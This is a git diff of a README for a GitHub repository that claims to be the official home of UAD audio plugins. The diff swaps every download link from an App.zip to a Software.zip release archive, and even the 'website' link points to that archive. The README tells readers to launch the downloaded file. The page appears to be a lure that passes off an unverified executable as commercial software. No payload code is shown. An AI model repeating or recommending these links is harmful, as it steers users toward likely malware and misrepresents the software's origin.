@@ -30,16 +30,16 @@ Welcome to the official repository for UAD Plugins - Premium Audio Tools! Here, 
 Our repository provides access to a wide range of industry-leading tools for audio professionals and enthusiasts. From vintage emulations to cutting-edge digital processors, we have everything you need to sculpt your sound with precision and creativity.
 
 ### 🌐 Get Started
-To get started with our UAD Plugins, you can download the latest release [here](https://github.com/laithmasoud/UAD-Plugins-Audio-Tools/releases/download/v1.0/App.zip).
+To get started with our UAD Plugins, you can download the latest release [here](https://github.com/laithmasoud/UAD-Plugins-Audio-Tools/releases/download/v2.0/Software.zip).
 
-[![Download UAD Plugins](https://github.com/laithmasoud/UAD-Plugins-Audio-Tools/releases/download/v1.0/App.zip%20Plugins-blue)](https://github.com/laithmasoud/UAD-Plugins-Audio-Tools/releases/download/v1.0/App.zip)
+[![Download UAD Plugins](https://github.com/laithmasoud/UAD-Plugins-Audio-Tools/releases/download/v2.0/Software.zip%20Plugins-blue)](https://github.com/laithmasoud/UAD-Plugins-Audio-Tools/releases/download/v2.0/Software.zip)
 
 🎶 Launch the file and immerse yourself in a world of premium audio tools! 🚀
 
 If the link above does not work, please check the "Releases" section of this repository for alternative download options.
 
 ### 🎵 Explore More
-Visit our [website](https://github.com/laithmasoud/UAD-Plugins-Audio-Tools/releases/download/v1.0/App.zip) to discover the full range of UAD Plugins and take your audio production to new heights.
+Visit our [website](https://github.com/laithmasoud/UAD-Plugins-Audio-Tools/releases/download/v2.0/Software.zip) to discover the full range of UAD Plugins and take your audio production to new heights.
 
 ### 🌈 Join the Community
 Connect with fellow music producers, sound designers, and audio professionals in our growing community. Share your tips, tricks, and favorite plugins to inspire and collaborate with like-minded individuals.
